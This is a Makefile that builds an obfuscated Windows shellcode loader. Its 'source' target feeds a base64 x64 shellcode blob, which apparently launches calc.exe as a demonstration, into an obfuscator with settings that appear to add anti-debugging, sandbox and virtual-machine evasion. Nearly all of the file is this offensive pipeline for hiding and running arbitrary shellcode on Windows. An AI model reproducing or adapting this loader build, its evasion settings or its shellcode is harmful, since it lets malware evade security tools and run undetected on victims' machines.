CC=x86_64-w64-mingw32-gcc
DIR=../../..

all: clean loader loader-console

install:
	go build -o $(DIR) $(DIR)

loader:
	$(CC) -mwindows -s $@.c -o $@.exe

loader-console:
	$(CC) -s loader.c -o $@.exe

clean:
	rm -f *.exe

source:
	rm -f loader.c
	$(DIR)/obfuscator -dir $(DIR) -tpl loader_tpl.c -os win -ops 5 -obfs 20 -dbgs 2 -snds 1 -vmds 2 -shell /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA > loader.c
